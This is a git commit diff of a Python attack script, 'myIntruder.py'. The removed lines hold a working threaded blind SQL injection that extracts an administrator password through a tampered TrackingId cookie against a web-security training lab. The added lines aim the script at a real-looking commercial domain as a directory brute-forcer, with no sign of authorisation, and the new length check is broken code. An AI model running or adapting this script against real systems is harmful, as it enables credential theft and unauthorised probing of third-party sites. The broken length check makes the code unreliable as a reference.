5d7a747efe5663ef597bbc196c1fd9b47bda1562
kobidsim <simkhadakobid@gmail.com>
2021-08-18 12:32:14 +0545

    For testing gyapu

--- myIntruder.py
+++ myIntruder.py
@@ -4,7 +4,7 @@ import re
 
 def getPayload():
 	payloads = []
-	with open("./asciiChars.txt", "r") as f:
+	with open("./gyapu.txt", "r") as f:
 		payloads = f.read().split('\n')
 
 	return payloads
@@ -12,39 +12,39 @@ def getPayload():
 def sendGetRequest(domain, index, payload):
 	parameters = {}
 	headers = {}
-	cookies = { 'TrackingId':f'dMzIYe8HpIvHYLeI\'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=\'administrator\'),{index},1)=\'{payload}',
-				'session':'kyOezoeECmPPXbQnxgx6vdomwPc47h2t'}
+	cookies = {}
 
+	domain += payload
 	r = requests.get(domain, cookies=cookies)
 	return r
 
 payloads = getPayload()
-domain = 'https://aca81fdb1e35733380055fe700880024.web-security-academy.net/'
+domain = 'https://www.gyapu.com/'
 password = ''
 
 def sendIt(payload, index):
 	response = sendGetRequest(domain, index, payload)
 	match = response.text
-	if match.find('Welcome back!') != -1:
-		print('FoundChar:',payload)
+	if response.length != 5662:
+		print('Found for dir:',payload)
 		return payload
 	else:
 		return None
 
 i = 1
 found = True
-while found:
-	threads = []
 
-	with concurrent.futures.ThreadPoolExecutor() as executor:
-		threads = [executor.submit(sendIt, payload, i) for payload in payloads]
+threads = []
 
-		found = False
-		for f in concurrent.futures.as_completed(threads):
-			if f.result() != None:
-				password+=f.result()
-				found = True
-				i+=1
+with concurrent.futures.ThreadPoolExecutor() as executor:
+	threads = [executor.submit(sendIt, payload, i) for payload in payloads]
+
+	found = False
+	for f in concurrent.futures.as_completed(threads):
+		if f.result() != None:
+			password+=f.result()
+			found = True
+			i+=1
 
 print("Found:", found)
-print('Success')
+print('Operation Complete')
